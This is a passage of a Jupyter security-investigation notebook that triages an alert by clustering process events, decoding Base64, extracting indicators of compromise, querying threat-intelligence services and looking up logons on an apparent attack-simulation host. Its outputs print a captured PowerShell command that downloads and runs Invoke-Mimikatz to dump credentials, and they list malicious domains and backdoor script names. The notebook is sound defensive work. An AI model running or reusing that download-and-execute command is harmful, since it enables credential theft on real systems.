       "7              1                     25       3130            False  \n",
       "38             2                     35       7803            False  \n",
       "43             3                      4       3153            False  \n",
       "45             4                      5       3153            False  \n",
       "49             3                     14       2164            False  \n",
       "50             2                     31       2570            False  \n",
       "52             3                      9       3042            False  \n",
       "53             6                      7       2952            False  \n",
       "54             2                      0       2502            False  \n",
       "4             18                     42       7542            False  \n",
       "57             3                     49       7803            False  \n",
       "58             2                     53       7803            False  \n",
       "89             5                     50       5576            False  \n",
       "94             2                     22       2886            False  \n",
       "62             4                     10       2638            False  \n",
       "121            3                     13       1663            False  \n",
       "127            2                      2       2907            False  \n",
       "2              2                     45       2580            False  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "if 'clus_events' in locals() and not clus_events.empty:\n",
    "    resp = input('View the clustered data? y/n')\n",
    "    if resp == 'y':\n",
    "        display(clus_events.sort_values('TimeGenerated')[['TimeGenerated', 'LastEventTime',\n",
    "                                                          'NewProcessName', 'CommandLine', \n",
    "                                                          'ClusterSize', 'commandlineTokensFull',\n",
    "                                                          'pathScore', 'isSystemSession']])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:35:25.349558Z",
     "start_time": "2019-10-31T22:35:25.289665Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "You can view the cluster members for individual processesby inserting a new cell and entering:<br>`&gt;&gt;&gt; view_cluster(process_name)`<br>where process_name is the unqualified process binary. E.g<br>`&gt;&gt;&gt; view_cluster('reg.exe')`"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Look at clusters for individual process names\n",
    "def view_cluster(exe_name):\n",
    "    display(clus_events[['ClusterSize', 'processName', 'CommandLine', 'ClusterId']][clus_events['processName'] == exe_name])\n",
    "    \n",
    "display(Markdown('You can view the cluster members for individual processes'\n",
    "                 'by inserting a new cell and entering:<br>'\n",
    "                 '`>>> view_cluster(process_name)`<br></div>'\n",
    "                 'where process_name is the unqualified process binary. E.g<br>'\n",
    "                 '`>>> view_cluster(\\'reg.exe\\')`'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Time Line of  clustered processes data vs. original data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:35:34.861495Z",
     "start_time": "2019-10-31T22:35:34.457479Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span>Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {},
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {},
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "1722"
      }
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Show timeline of events - clustered events\n",
    "if 'clus_events' in locals() and not clus_events.empty:\n",
    "    nbdisplay.display_timeline(data=clus_events, \n",
    "                            overlay_data=processes_on_host, \n",
    "                            alert=security_alert, \n",
    "                            title='Distinct Host Processes (bottom) and All Proceses (top)')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a></a>[Contents](#toc)\n",
    "## Base64 Decode and Check for IOCs\n",
    "This section looks for Indicators of Compromise (IoC) within the data sets passed to it.\n",
    "\n",
    "The first section looks at the command line for the process related to our original alert (if any). It also looks for Base64 encoded strings within the data - this is a common way of hiding attacker intent. It attempts to decode any strings that look like Base64. Additionally, if the Base64 decode operation returns any items that look like a Base64 encoded string or file, a gzipped binary sequence, a zipped or tar archive, it will attempt to extract the contents before searching for potentially interesting items."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:35:41.329251Z",
     "start_time": "2019-10-31T22:35:40.542962Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Potential IoCs found in alert process:\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "defaultdict(set,\n",
       "            {'dns': {'invoke-mimikatz.ps', 'raw.githubusercontent.com'},\n",
       "             'url': {\"https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1');invoke-mimikatz\"}})"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "process = security_alert.primary_process\n",
    "ioc_extractor = IoCExtract()\n",
    "\n",
    "if process:\n",
    "    # if nothing is decoded this just returns the input string unchanged\n",
    "    base64_dec_str, _ = base64.unpack_items(input_string=process[\"CommandLine\"])\n",
    "    if base64_dec_str and '<decoded' in base64_dec_str:\n",
    "        print('Base64 encoded items found.')\n",
    "        print(base64_dec_str)\n",
    "        \n",
    "    # any IoCs in the string?\n",
    "    iocs_found = ioc_extractor.extract(base64_dec_str)\n",
    "    \n",
    "    if iocs_found:\n",
    "        print('\\nPotential IoCs found in alert process:')\n",
    "        display(iocs_found)\n",
    "else:\n",
    "    print('Nothing to process')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### IoCs in the entire data set\n",
    "If we have a process tree or other elements that contain command lines we also want to attempt to extract IoCs from these data sets."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:35:47.273298Z",
     "start_time": "2019-10-31T22:35:46.7981Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3>IoC patterns found in process tree.</h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>IoCType</th>\n",
       "      <th>Observable</th>\n",
       "      <th>SourceIndex</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>dns</td>\n",
       "      <td>freenow.chickenkiller.com</td>\n",
       "      <td>41</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>dns</td>\n",
       "      <td>nc.ps</td>\n",
       "      <td>85</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>dns</td>\n",
       "      <td>nc.ps</td>\n",
       "      <td>86</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>dns</td>\n",
       "      <td>www.googleaccountsservices.com</td>\n",
       "      <td>86</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>dns</td>\n",
       "      <td>WMIBackdoor.ps</td>\n",
       "      <td>159</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>10.34.2.3</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>dns</td>\n",
       "      <td>schtasks-backdoor.ps</td>\n",
       "      <td>4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>8.8.8.8</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>dns</td>\n",
       "      <td>schtasks-backdoor.ps</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>dns</td>\n",
       "      <td>msupdater.com</td>\n",
       "      <td>38</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>dns</td>\n",
       "      <td>msupdater.com</td>\n",
       "      <td>43</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>dns</td>\n",
       "      <td>freenow.chickenkiller.com</td>\n",
       "      <td>45</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>dns</td>\n",
       "      <td>raw.githubusercontent.com</td>\n",
       "      <td>50</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>url</td>\n",
       "      <td>https://raw.githubusercontent.com/NextronSystems/APTSimulator/master/download/cactus.js</td>\n",
       "      <td>50</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>dns</td>\n",
       "      <td>www.google.com</td>\n",
       "      <td>57</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>dns</td>\n",
       "      <td>www.google.com</td>\n",
       "      <td>58</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>dns</td>\n",
       "      <td>googleaccountsservices.com</td>\n",
       "      <td>89</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>dns</td>\n",
       "      <td>googleaccountsservices.com'</td>\n",
       "      <td>89</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>dns</td>\n",
       "      <td>WMIBackdoor.ps</td>\n",
       "      <td>89</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>url</td>\n",
       "      <td>http://googleaccountsservices.com'</td>\n",
       "      <td>89</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>ipv4</td>\n",
       "      <td>192.168.1.0</td>\n",
       "      <td>121</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   IoCType  \\\n",
       "0      dns   \n",
       "1      dns   \n",
       "2      dns   \n",
       "3      dns   \n",
       "4      dns   \n",
       "5     ipv4   \n",
       "6     ipv4   \n",
       "7      dns   \n",
       "8     ipv4   \n",
       "9      dns   \n",
       "10     dns   \n",
       "11     dns   \n",
       "12     dns   \n",
       "13     dns   \n",
       "14     url   \n",
       "15     dns   \n",
       "16     dns   \n",
       "17     dns   \n",
       "18     dns   \n",
       "19     dns   \n",
       "20     url   \n",
       "21    ipv4   \n",
       "\n",
       "                                                                                 Observable  \\\n",
       "0                                                                 freenow.chickenkiller.com   \n",
       "1                                                                                     nc.ps   \n",
       "2                                                                                     nc.ps   \n",
       "3                                                            www.googleaccountsservices.com   \n",
       "4                                                                            WMIBackdoor.ps   \n",
       "5                                                                                 10.34.2.3   \n",
       "6                                                                                 127.0.0.1   \n",
       "7                                                                      schtasks-backdoor.ps   \n",
       "8                                                                                   8.8.8.8   \n",
       "9                                                                      schtasks-backdoor.ps   \n",
       "10                                                                            msupdater.com   \n",
       "11                                                                            msupdater.com   \n",
       "12                                                                freenow.chickenkiller.com   \n",
       "13                                                                raw.githubusercontent.com   \n",
       "14  https://raw.githubusercontent.com/NextronSystems/APTSimulator/master/download/cactus.js   \n",
       "15                                                                           www.google.com   \n",
       "16                                                                           www.google.com   \n",
       "17                                                               googleaccountsservices.com   \n",
       "18                                                              googleaccountsservices.com'   \n",
       "19                                                                           WMIBackdoor.ps   \n",
       "20                                                       http://googleaccountsservices.com'   \n",
       "21                                                                              192.168.1.0   \n",
       "\n",
       "    SourceIndex  \n",
       "0            41  \n",
       "1            85  \n",
       "2            86  \n",
       "3            86  \n",
       "4           159  \n",
       "5             2  \n",
       "6             3  \n",
       "7             4  \n",
       "8             5  \n",
       "9             5  \n",
       "10           38  \n",
       "11           43  \n",
       "12           45  \n",
       "13           50  \n",
       "14           50  \n",
       "15           57  \n",
       "16           58  \n",
       "17           89  \n",
       "18           89  \n",
       "19           89  \n",
       "20           89  \n",
       "21          121  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "ioc_extractor = IoCExtract()\n",
    "\n",
    "source_processes = None\n",
    "# if process tree is populated we use that preferentially\n",
    "try:\n",
    "    if not process_tree.empty:\n",
    "        source_processes = process_tree\n",
    "except (NameError, AttributeError):\n",
    "    pass \n",
    "\n",
    "# If not, use the clustered events from the all sessions\n",
    "try:\n",
    "    if source_processes is None and not clus_events.empty:\n",
    "        source_processes = clus_events\n",
    "except (NameError, AttributeError):\n",
    "    pass\n",
    "    \n",
    "if source_processes is not None and not source_processes.empty: \n",
    "    ioc_df = ioc_extractor.extract(data=source_processes, \n",
    "                                   columns=['CommandLine'], \n",
    "                                   os_family=security_alert.os_family,\n",
    "                                   ioc_types=['ipv4', 'ipv6', 'dns', 'url',\n",
    "                                              'md5_hash', 'sha1_hash', 'sha256_hash'])\n",
    "    if len(ioc_df):\n",
    "        display(HTML(\"<h3>IoC patterns found in process tree.</h3>\"))\n",
    "        display(ioc_df)\n",
    "else:\n",
    "    ioc_df = None"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### If any Base64 encoded strings, decode and search for IoCs in the results.\n",
    "For simple strings the Base64 decoded output is straightforward. However it is not uncommon to see nested encodings therefore we want to try to extract and decode these nested elements as well."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:35:53.370097Z",
     "start_time": "2019-10-31T22:35:53.322939Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "No base64 encodings found.\n"
     ]
    }
   ],
   "source": [
    "if source_processes is not None:\n",
    "    dec_df = base64.unpack_items(data=source_processes, column='CommandLine')\n",
    "    \n",
    "if source_processes is not None and (dec_df is not None and not dec_df.empty):\n",
    "    display(HTML(\"<h3>Decoded base 64 command lines</h3>\"))\n",
    "    display(HTML(\"Warning - some binary patterns may be decodable as unicode strings\"))\n",
    "    display(dec_df[['full_decoded_string', 'original_string', 'decoded_string', 'input_bytes', 'file_hashes']])\n",
    "\n",
    "    ioc_dec_df = ioc_extractor.extract(data=dec_df, columns=['full_decoded_string'])\n",
    "    if len(ioc_dec_df):\n",
    "        display(HTML(\"<h3>IoC patterns found in base 64 decoded data</h3>\"))\n",
    "        display(ioc_dec_df)\n",
    "        if ioc_df is not None:\n",
    "            ioc_df = ioc_df.append(ioc_dec_df ,ignore_index=True)\n",
    "        else:\n",
    "            ioc_df = ioc_dec_df\n",
    "else:\n",
    "    print(\"No base64 encodings found.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "## Threat Intelligence Lookup\n",
    "Now that we have identified a number of IoCs we want to check to see if they are associated with known mallicious activity. To do this we will query three different Threat Intelligence providers to see if we get results.\n",
    "\n",
    "We will be using:\n",
    "- VirusTotal https://www.virustotal.com/.\n",
    "- Alienware OTX https://otx.alienvault.com/\n",
    "- IBM X-Force https://exchange.xforce.ibmcloud.com/\n",
    "\n",
    "If you do not have an API key for any of these providers simply remove their name from the providers list in our lookup_iocs command."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:36:05.780999Z",
     "start_time": "2019-10-31T22:35:56.237293Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "<p style=\"font-weight: bold; color: red; font-size: 130%;\">Positive TI Results:</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Ioc</th>\n",
       "      <th>IocType</th>\n",
       "      <th>QuerySubtype</th>\n",
       "      <th>Provider</th>\n",
       "      <th>Result</th>\n",
       "      <th>Severity</th>\n",
       "      <th>Details</th>\n",
       "      <th>RawResult</th>\n",
       "      <th>Reference</th>\n",
       "      <th>Status</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>freenow.chickenkiller.com</td>\n",
       "      <td>dns</td>\n",
       "      <td>None</td>\n",
       "      <td>VirusTotal</td>\n",
       "      <td>True</td>\n",
       "      <td>2</td>\n",
       "      <td>{'verbose_msg': 'Domain found in dataset', 'response_code': 1, 'detected_urls': ['http://freenow...</td>\n",
       "      <td>{'undetected_downloaded_samples': [], 'detected_downloaded_samples': [], 'detected_referrer_samp...</td>\n",
       "      <td>https://www.virustotal.com/vtapi/v2/domain/report</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>www.googleaccountsservices.com</td>\n",
       "      <td>dns</td>\n",
       "      <td>None</td>\n",
       "      <td>VirusTotal</td>\n",
       "      <td>True</td>\n",
       "      <td>2</td>\n",
       "      <td>{'verbose_msg': 'Domain found in dataset', 'response_code': 1, 'detected_urls': ['http://www.goo...</td>\n",
       "      <td>{'domain_siblings': ['f83zx-138iklspool-arp.googleaccountsservices.com', 'www.f83zx-138iklspool-...</td>\n",
       "      <td>https://www.virustotal.com/vtapi/v2/domain/report</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>freenow.chickenkiller.com</td>\n",
       "      <td>dns</td>\n",
       "      <td>None</td>\n",
       "      <td>VirusTotal</td>\n",
       "      <td>True</td>\n",
       "      <td>2</td>\n",
       "      <td>{'verbose_msg': 'Domain found in dataset', 'response_code': 1, 'detected_urls': ['http://freenow...</td>\n",
       "      <td>{'undetected_downloaded_samples': [], 'detected_downloaded_samples': [], 'detected_referrer_samp...</td>\n",
       "      <td>https://www.virustotal.com/vtapi/v2/domain/report</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>8.8.8.8</td>\n",
       "      <td>ipv4</td>\n",
       "      <td>None</td>\n",
       "      <td>OTX</td>\n",
       "      <td>True</td>\n",
       "      <td>2</td>\n",
       "      <td>{'pulse_count': 9, 'names': ['scan test pulse #1', 'test test 2', 'Googled DNS test', 'Test Puls...</td>\n",
       "      <td>{'sections': ['general', 'geo', 'reputation', 'url_list', 'passive_dns', 'malware', 'nids_list',...</td>\n",
       "      <td>https://otx.alienvault.com/api/v1/indicators/IPv4/8.8.8.8/general</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                               Ioc IocType QuerySubtype    Provider  Result  \\\n",
       "0        freenow.chickenkiller.com     dns         None  VirusTotal    True   \n",
       "3   www.googleaccountsservices.com     dns         None  VirusTotal    True   \n",
       "12       freenow.chickenkiller.com     dns         None  VirusTotal    True   \n",
       "8                          8.8.8.8    ipv4         None         OTX    True   \n",
       "\n",
       "    Severity  \\\n",
       "0          2   \n",
       "3          2   \n",
       "12         2   \n",
       "8          2   \n",
       "\n",
       "                                                                                                Details  \\\n",
       "0   {'verbose_msg': 'Domain found in dataset', 'response_code': 1, 'detected_urls': ['http://freenow...   \n",
       "3   {'verbose_msg': 'Domain found in dataset', 'response_code': 1, 'detected_urls': ['http://www.goo...   \n",
       "12  {'verbose_msg': 'Domain found in dataset', 'response_code': 1, 'detected_urls': ['http://freenow...   \n",
       "8   {'pulse_count': 9, 'names': ['scan test pulse #1', 'test test 2', 'Googled DNS test', 'Test Puls...   \n",
       "\n",
       "                                                                                              RawResult  \\\n",
       "0   {'undetected_downloaded_samples': [], 'detected_downloaded_samples': [], 'detected_referrer_samp...   \n",
       "3   {'domain_siblings': ['f83zx-138iklspool-arp.googleaccountsservices.com', 'www.f83zx-138iklspool-...   \n",
       "12  {'undetected_downloaded_samples': [], 'detected_downloaded_samples': [], 'detected_referrer_samp...   \n",
       "8   {'sections': ['general', 'geo', 'reputation', 'url_list', 'passive_dns', 'malware', 'nids_list',...   \n",
       "\n",
       "                                                            Reference  Status  \n",
       "0                   https://www.virustotal.com/vtapi/v2/domain/report       0  \n",
       "3                   https://www.virustotal.com/vtapi/v2/domain/report       0  \n",
       "12                  https://www.virustotal.com/vtapi/v2/domain/report       0  \n",
       "8   https://otx.alienvault.com/api/v1/indicators/IPv4/8.8.8.8/general       0  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "tilookups = TILookup()\n",
    "if ioc_df is not None and not ioc_df.empty:\n",
    "    ti_results = tilookups.lookup_iocs(data=ioc_df, obs_col='Observable', ioc_type_col='IoCType', providers=[\"OTX\", \"VirusTotal\", \"XForce\"])\n",
    "    if not ti_results[ti_results['Severity'] > 0].empty:\n",
    "        md(\"Positive TI Results:\",styles=[\"bold\",\"red\",\"large\"])\n",
    "        display(ti_results[ti_results['Severity'] > 0])\n",
    "    else:\n",
    "        md(\"No postive matches found in threat intelligence\",styles=[\"bold\",\"green\"])\n",
    "else:\n",
    "    md_warn(\"No IOCs to lookup\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Alert command line - Occurrence on other hosts in workspace\n",
    "Understanding where else a command line is being run in an environment can give us a good idea of the scope of a security incident, or help us determine whether activity is malicious or expected.\n",
    "\n",
    "To get a sense of whether the alert process is something that is occuring on other hosts, run this section."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:08:17.176933Z",
     "start_time": "2019-10-31T22:08:17.030505Z"
    },
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HTML(value='<h4>Set query time boundaries</h4>')"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "HBox(children=(DatePicker(value=datetime.date(2019, 2, 10), description='Origin Date'), Text(value='06:15:06',…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "VBox(children=(IntRangeSlider(value=(-5, 1), description='Time Range (day):', layout=Layout(width='80%'), max=…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# set the origin time to the time of our alert\n",
    "query_times = nbwidgets.QueryTime(units='day', before=5, max_before=20,\n",
    "                            after=1, max_after=10,\n",
    "                            origin_time=security_alert.origin_time)\n",
    "query_times.display()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:43:47.810291Z",
     "start_time": "2019-10-31T22:43:44.866223Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "<p style=\"font-weight: bold; color: red;\">Command Line: powershell.exe  'iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/mattifestation/powersploit/master/exfiltration/invoke-mimikatz.ps1');invoke-mimikatz -dumpcreds'</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "<p style=\"font-weight: bold; color: blue;\">No proceses with matching commandline found in on other hosts in workspace</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "<p style=\"font-weight: bold;\">between:, 2019-09-12 20:07:31, and, 2019-09-12 21:59:31</p>"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# This query needs a commandline parameter which isn't supplied\n",
    "# by default from the the alert \n",
    "# - so extract and escape this from the process\n",
    "if not security_alert.primary_process:\n",
    "    md_warn('This alert has no process entity. This section is not applicable.')\n",
    "    \n",
    "\n",
    "elif security_alert.primary_process:\n",
    "    proc_match_in_ws = None\n",
    "    commandline = security_alert.primary_process.CommandLine\n",
    "    commandline = utility.escape_windows_path(commandline)\n",
    "    commandline = commandline.replace('\"',\"'\")\n",
    "    process = security_alert.ExtendedProperties['Suspicious Process']\n",
    "    process = utility.escape_windows_path(process)\n",
    "    process = process.replace('\"',\"'\")\n",
    "    md(f\"Command Line: {commandline}\", styles=[\"bold\",\"red\"])\n",
    "\n",
    "    if commandline.strip():\n",
    "        proc_match_in_ws = qry_prov.WindowsSecurity.list_hosts_matching_commandline(start=query_times.start, end=query_times.end, process_name=process,\n",
    "                                                              commandline=commandline)\n",
    "\n",
    "    else:\n",
    "        md('process has empty commandline')\n",
    "# Check the results\n",
    "if proc_match_in_ws is None or proc_match_in_ws.empty:\n",
    "    md('No proceses with matching commandline found in on other hosts in workspace',styles=[\"bold\",\"blue\"])\n",
    "    md(f'between:, {query_times.start}, and, {query_times.end}',styles=[\"bold\"])\n",
    "else:\n",
    "    hosts = proc_match_in_ws['Computer'].drop_duplicates().shape[0]\n",
    "    processes = proc_match_in_ws.shape[0]\n",
    "    md('{numprocesses} proceses with matching commandline found on {numhosts} hosts in workspace'\\\n",
    "         .format(numprocesses=processes, numhosts=hosts))\n",
    "    md('between', query_times.start, 'and', query_times.end)\n",
    "    md('To examine these execute the dataframe \\'{}\\' in a new cell'.format('proc_match_in_ws'))\n",
    "    md(proc_match_in_ws[['TimeCreatedUtc','Computer', 'NewProcessName', 'CommandLine']].head())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If at this point you wish to investigate a particular host in detail you can use the cells below or you can switch to our Host Investigation Notebooks that provide a deep dive capability for Windows and Linux hosts.\n",
    "\n",
    "## Host Logons\n",
    "This section retrieves the logon events on the host in the alert.\n",
    "\n",
    "You may want to use the query times to search over a broader range than the default."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:45:36.28834Z",
     "start_time": "2019-10-31T22:45:36.0799Z"
    },
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HTML(value='<h4>Set query time boundaries</h4>')"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "HBox(children=(DatePicker(value=datetime.date(2019, 9, 12), description='Origin Date'), Text(value='21:37:31',…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "VBox(children=(IntRangeSlider(value=(-1, 0), description='Time Range (day):', layout=Layout(width='80%'), max=…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# set the origin time to the time of our alert\n",
    "query_times = nbwidgets.QueryTime(units='day', origin_time=security_alert.origin_time,\n",
    "                           before=1, after=0, max_before=20, max_after=1)\n",
    "query_times.display()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "If you wish to investigate a specific host in detail you can use the cells below or switch to our Account investigation notebook. \n",
    "\n",
    "## Alert Logon Account\n",
    "This returns the account associated with the alert being investigated."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 153,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T22:53:19.353845Z",
     "start_time": "2019-10-31T22:53:17.100675Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "### Account Logon\n",
      "Account:  AttackAdmin\n",
      "Account Domain:  WinAttackSim\n",
      "Logon Time:  2019-09-11 23:00:38.923000\n",
      "Logon type: 10  (RemoteInteractive)\n",
      "User Id/SID:  S-1-5-21-3355618666-3700345348-2252427328-500\n",
      "    SID S-1-5-21-3355618666-3700345348-2252427328-500 is administrator\n",
      "    SID S-1-5-21-3355618666-3700345348-2252427328-500 is local machine or domain account\n",
      "Session id '0x1caf88b'  \n",
      "Subject (source) account:  WORKGROUP/WinAttackSim$\n",
      "Logon process:  User32 \n",
      "Authentication:  Negotiate\n",
      "Source IpAddress:  131.107.160.233\n",
      "Source Host:  WinAttackSim\n",
      "Logon status:  \n",
      "\n"
     ]
    }
   ],
   "source": [
    "logon_id = security_alert.get_logon_id()\n",
    "\n",
    "if logon_id:\n",
    "    if logon_id in ['0x3e7', '0X3E7', '-1', -1]:\n",
    "        print('Cannot retrieve single logon event for system logon id '\n",
    "              '- please continue with All Host Logons below.')\n",
    "    else:\n",
    "        logon_event = qry_prov.WindowsSecurity.get_host_logon(provs=[query_times, security_alert], host_name=security_alert.ExtendedProperties['Compromised Host'],start=query_times.start, end= query_times.end,logon_session_id=sess_id)\n",
